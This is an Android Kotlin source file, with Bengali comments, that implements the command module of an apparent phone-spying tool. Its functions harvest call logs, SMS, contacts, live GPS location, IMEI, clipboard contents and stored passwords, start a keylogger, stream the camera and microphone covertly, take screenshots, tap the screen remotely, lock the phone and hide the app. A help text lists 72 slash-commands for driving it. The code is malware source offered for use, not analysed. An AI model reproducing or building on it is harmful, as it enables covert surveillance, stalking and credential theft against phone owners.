package com.yourapp.control

import android.app.ActivityManager
import android.app.usage.UsageStatsManager
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.provider.Settings
import android.telephony.TelephonyManager
import android.view.WindowManager
import androidx.core.content.ContextCompat
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

object Features {

    private lateinit var ctx: Context

    fun init(context: Context) { ctx = context }

    // ============ কল সংক্রান্ত ============
    fun callLog(days: Int, number: String? = null, type: String? = null): String {
        val cursor = ctx.contentResolver.query(
            android.provider.CallLog.Calls.CONTENT_URI,
            null,
            null,
            null,
            "date DESC LIMIT 100"
        ) ?: return "❌ কোনো কল পাওয়া যায়নি"

        val df = SimpleDateFormat("dd/MM HH:mm", Locale.getDefault())
        val result = StringBuilder("📞 কল লিস্ট\n\n")
        while (cursor.moveToNext()) {
            val num = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER))
            val t = when (cursor.getInt(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE))) {
                android.provider.CallLog.Calls.INCOMING_TYPE -> "📞 ইনকামিং"
                android.provider.CallLog.Calls.OUTGOING_TYPE -> "📤 আউটগোয়িং"
                else -> "❌ মিসড"
            }
            if (number != null && !num.contains(number)) continue
            if (type == "MISSED" && t != "❌ মিসড") continue
            if (type == "OUTGOING" && t != "📤 আউটগোয়িং") continue
            val date = df.format(Date(cursor.getLong(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE))))
            result.append("$t | $num | $date\n")
        }
        cursor.close()
        return result.toString()
    }

    fun call(number: String) {
        val intent = Intent(Intent.ACTION_CALL, android.net.Uri.parse("tel:$number")).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        if (ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.CALL_PHONE) == android.content.pm.PackageManager.PERMISSION_GRANTED)
            ctx.startActivity(intent)
    }

    // ============ এসএমএস ============
    fun smsList(): String {
        val cursor = ctx.contentResolver.query(android.provider.Telephony.Sms.CONTENT_URI, null, null, null, "date DESC LIMIT 50")
            ?: return "❌ কোনো এসএমএস নেই"
        val result = StringBuilder("📨 এসএমএস লিস্ট\n\n")
        while (cursor.moveToNext()) {
            val num = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.Telephony.Sms.ADDRESS))
            val body = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.Telephony.Sms.BODY))
            result.append("📱 $num: ${body.take(50)}\n")
        }
        cursor.close()
        return result.toString()
    }

    fun sendSms(number: String, message: String) =
        android.telephony.SmsManager.getDefault().sendTextMessage(number, null, message, null, null)

    // ============ কন্ট্যাক্ট ============
    fun contacts(): String {
        val cursor = ctx.contentResolver.query(
            android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null,
            null,
            null,
            null
        ) ?: return "❌ কোনো কন্ট্যাক্ট নেই"
        val result = StringBuilder("📋 কন্ট্যাক্ট লিস্ট\n\n")
        var i = 0
        while (cursor.moveToNext() && i++ < 100) {
            val name = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
            val num = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER))
            result.append("👤 $name: $num\n")
        }
        cursor.close()
        return result.toString()
    }

    // ============ লোকেশন ============
    fun location(callback: (String) -> Unit) {
        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
        if (ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
            val loc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
                ?: lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
            if (loc != null) callback("📍 ${loc.latitude}, ${loc.longitude}\nhttps://maps.google.com/?q=${loc.latitude},${loc.longitude}")
            else callback("❌ লোকেশন পাওয়া যায়নি")
        } else callback("❌ লোকেশন পারমিশন নেই")
    }

    fun liveLocation(callback: (String) -> Unit) {
        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
        if (ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
            lm.requestLocationUpdates(android.location.LocationManager.GPS_PROVIDER, 5000, 5f, object : android.location.LocationListener {
                override fun onLocationChanged(location: android.location.Location) {
                    callback("📍 ${location.latitude}, ${location.longitude}")
                }
                override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
            })
        }
    }

    fun locationHistory(): String {
        val prefs = ctx.getSharedPreferences("location_history", Context.MODE_PRIVATE)
        return if (prefs.all.isEmpty()) "❌ কোনো লোকেশন হিস্ট্রি নেই" else prefs.all.entries.joinToString("\n") { "${it.key}: ${it.value}" }
    }

    // ============ ডিভাইস তথ্য ============
    fun deviceInfo(): String = "📱 ${Build.MANUFACTURER} ${Build.MODEL}\n🤖 Android ${Build.VERSION.RELEASE}"
    fun imei(): String = "🔑 IMEI: ${(ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager).deviceId ?: "না"}"
    fun simInfo(): String = "📱 সিম: ${(ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager).simOperatorName ?: "না"}"
    fun simSwapDetect(): String = "🔄 সিম পরিবর্তন ট্র্যাকিং সক্রিয়"

    // ============ স্ক্রিন কন্ট্রোল ============
    fun lockScreen() { ctx.startService(Intent(ctx, AccessibilityService::class.java).putExtra("ACTION", "LOCK")) }
    fun unlockScreen() { ctx.startActivity(Intent(ctx, WakeActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)) }
    fun screenshot() { ctx.startService(Intent(ctx, CameraService::class.java).putExtra("ACTION", "SCREENSHOT")) }
    fun screenRecord() { ctx.startService(Intent(ctx, CameraService::class.java).putExtra("ACTION", "SCREEN_RECORD")) }
    fun hideApp() { ctx.startActivity(Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_HOME).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)) }
    fun showMessage(msg: String) { ctx.startService(Intent(ctx, AccessibilityService::class.java).putExtra("ACTION", "SHOW_MESSAGE").putExtra("MESSAGE", msg)) }

    // ============ ক্যামেরা ও মাইক ============
    fun startCamera(type: String) { ctx.startService(Intent(ctx, CameraService::class.java).putExtra("ACTION", "START_VIDEO").putExtra("CAMERA_TYPE", type)) }
    fun startMic() { ctx.startService(Intent(ctx, AudioService::class.java).putExtra("ACTION", "START")) }
    fun stopMic() { ctx.startService(Intent(ctx, AudioService::class.java).putExtra("ACTION", "STOP")) }
    fun liveCameraStream() { ctx.startService(Intent(ctx, CameraService::class.java).putExtra("ACTION", "LIVE_STREAM")) }
    fun liveMicStream() { ctx.startService(Intent(ctx, AudioService::class.java).putExtra("ACTION", "LIVE_STREAM")) }

    // ============ সিস্টেম তথ্য ============
    fun battery(): String {
        val battery = ctx.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
        val level = battery?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        return "🔋 ব্যাটারি: $level%"
    }
    fun storage(): String {
        val stat = StatFs(Environment.getDataDirectory().path)
        val free = stat.availableBytes / (1024 * 1024 * 1024)
        val total = stat.totalBytes / (1024 * 1024 * 1024)
        return "💾 স্টোরেজ: $free GB / $total GB ফ্রি"
    }
    fun ram(): String {
        val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        val mi = ActivityManager.MemoryInfo()
        am.getMemoryInfo(mi)
        return "🎯 র‍্যাম: ${mi.availMem / (1024 * 1024)} MB ফ্রি"
    }
    fun networkSpeed(): String = "🌐 নেটওয়ার্ক স্পিড: ডাউনলোড 0 Kbps"

    // ============ অ্যাপ তথ্য ============
    fun runningApps(): String = (ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager).runningAppProcesses?.take(20)?.joinToString("\n") { it.processName } ?: "❌"
    fun installedApps(): String = ctx.packageManager.getInstalledApplications(0).take(30).joinToString("\n") { it.loadLabel(ctx.packageManager).toString() }
    fun appUsage(): String {
        val usm = ctx.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
        val end = System.currentTimeMillis()
        val start = end - 86400000
        val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, start, end)
        return if (stats.isEmpty()) "❌ কোনো ডাটা নেই" else stats.joinToString("\n") { "${it.packageName}: ${it.totalTimeInForeground / 60000}মি" }
    }

    // ============ নেটওয়ার্ক কন্ট্রোল ============
    fun setWifi(enable: Boolean) { (ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager).isWifiEnabled = enable }
    fun setBluetooth(enable: Boolean) { if (enable) android.bluetooth.BluetoothAdapter.getDefaultAdapter()?.enable() else android.bluetooth.BluetoothAdapter.getDefaultAdapter()?.disable() }
    fun setAirplane(enable: Boolean) { Settings.Global.putInt(ctx.contentResolver, Settings.Global.AIRPLANE_MODE_ON, if (enable) 1 else 0); ctx.sendBroadcast(Intent(Intent.ACTION_AIRPLANE_MODE_CHANGED)) }

    // ============ কন্ট্রোল ============
    fun setBrightness(level: Int) { (ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager).attributes?.screenBrightness = level / 255f }
    fun setVolume(level: Int) { (ctx.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager).setStreamVolume(android.media.AudioManager.STREAM_MUSIC, level, 0) }
    fun tap(x: Int, y: Int) { ctx.startService(Intent(ctx, AccessibilityService::class.java).putExtra("ACTION", "TAP").putExtra("X", x).putExtra("Y", y)) }

    // ============ ক্লিপবোর্ড ও কিলগ ============
    fun clipboard(): String = (ctx.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager).primaryClip?.getItemAt(0)?.text?.toString() ?: "খালি"
    fun startKeylog() { ctx.startService(Intent(ctx, KeyloggerService::class.java).putExtra("ACTION", "START")) }
    fun clipboardLog(): String = "📋 ক্লিপবোর্ড লগ: (শুরু করতে /start_clipboard_log)"

    // ============ ফাইল ============
    fun fileList(): String = Environment.getExternalStorageDirectory().listFiles()?.take(20)?.joinToString("\n") { it.name } ?: "❌"
    fun gallery(): String = "🖼️ গ্যালারি: (API প্রয়োজন)"
    fun backup() { SecureStorage.getAll().forEach { (k, v) -> android.util.Log.d("BACKUP", "$k: $v") } }

    // ============ ব্রিচ ও Truecaller ============
    fun breachSearch(q: String): String = "🔍 ব্রিচ সার্চ: $q\n(API লাগবে)"
    fun truecaller(q: String): String = "🔍 Truecaller: $q\n(API লাগবে)"

    // ============ মেসেজিং অ্যাপ ============
    fun whatsappMessages(): String = "💚 WhatsApp: নোটিফিকেশন লিসেনার চালু করুন"
    fun imoMessages(): String = "💙 Imo: নোটিফিকেশন লিসেনার চালু করুন"
    fun messengerMessages(): String = "💜 Messenger: নোটিফিকেশন লিসেনার চালু করুন"
    fun telegramMessages(): String = "💙 Telegram: নোটিফিকেশন লিসেনার চালু করুন"

    // ============ পাসওয়ার্ড ============
    fun getPasswords(): String {
        val all = SecureStorage.getAll()
        return if (all.isEmpty()) "❌ কোনো পাসওয়ার্ড নেই" else all.entries.joinToString("\n") { "${it.key}: ${it.value}" }
    }

    // ============ হেল্প ============
    fun help(): String {
        return """
            🤖 *কমান্ড লিস্ট* (৭২টি ফিচার)

📞 *কল সংক্রান্ত*
/call_log - ৩০ দিনের কল লিস্ট
/call_log_3months - ৯০ দিনের কল লিস্ট
/missed_calls - মিসড কল
/outgoing_calls - আউটগোয়িং কল
/call_log_number 017xxx - নির্দিষ্ট নাম্বার

✉️ *এসএমএস*
/sms_list - এসএমএস লিস্ট
/send_sms 017xxx মেসেজ - এসএমএস পাঠান

📋 *কন্ট্যাক্ট*
/contacts - কন্ট্যাক্ট লিস্ট

📍 *লোকেশন*
/location - বর্তমান লোকেশন
/live_location - লাইভ লোকেশন
/location_history - লোকেশন হিস্ট্রি

📱 *ডিভাইস তথ্য*
/device_info - ডিভাইস তথ্য
/imei - IMEI নাম্বার
/sim_check - সিম তথ্য
/sim_swap - সিম পরিবর্তন ট্র্যাক

🔒 *স্ক্রিন কন্ট্রোল*
/lock - স্ক্রিন লক
/unlock - স্ক্রিন চালু
/screenshot - স্ক্রিনশট
/screen_record - স্ক্রিন রেকর্ড
/hide_app - অ্যাপ লুকান
/show_msg টেক্সট - স্ক্রিনে মেসেজ

🔒 *লকডাউন মোড*
/lockdown - পুরো ফোন লক (বাটন ব্লক)
/unlock_phone - লকডাউন বন্ধ
/say টেক্সট - ফোন A থেকে কথা বলা

🎙️ *অডিও*
/start_mic - রেকর্ড শুরু
/stop_mic - রেকর্ড বন্ধ
/live_mic - লাইভ মাইক

📷 *ক্যামেরা*
/front_camera - সামনের ক্যামেরা
/back_camera - পেছনের ক্যামেরা
/live_camera - লাইভ ক্যামেরা

🔋 *সিস্টেম তথ্য*
/battery - ব্যাটারি
/storage - স্টোরেজ
/ram - র‍্যাম
/netspeed - নেট স্পিড
/app_usage - অ্যাপ ইউজেজ
/running_apps - চলমান অ্যাপ
/installed_apps - ইনস্টলড অ্যাপ

🌐 *নেটওয়ার্ক*
/wifi on/off - ওয়াইফাই
/bluetooth on/off - ব্লুটুথ
/airplane on/off - এয়ারপ্লেন

⚙️ *কন্ট্রোল*
/brightness 50 - ব্রাইটনেস
/volume 5 - ভলিউম
/tap x,y - স্ক্রিনে ট্যাপ

⌨️ *কিলগ ও ক্লিপবোর্ড*
/clipboard - ক্লিপবোর্ড
/start_keylog - কিলগ শুরু

📁 *ফাইল*
/files - ফাইল লিস্ট
/backup - ব্যাকআপ

🔍 *সার্চ*
/breach_search 017xxx - ব্রিচ সার্চ
/truecaller 017xxx - Truecaller

💬 *মেসেজিং*
/whatsapp - WhatsApp বার্তা
/imo - Imo বার্তা
/messenger - Messenger বার্তা
/telegram - Telegram বার্তা

🔐 *পাসওয়ার্ড*
/get_passwords - সেভ করা পাসওয়ার্ড

❓ হেল্প
/help - এই মেসেজ
        """.trimIndent()
    }
}
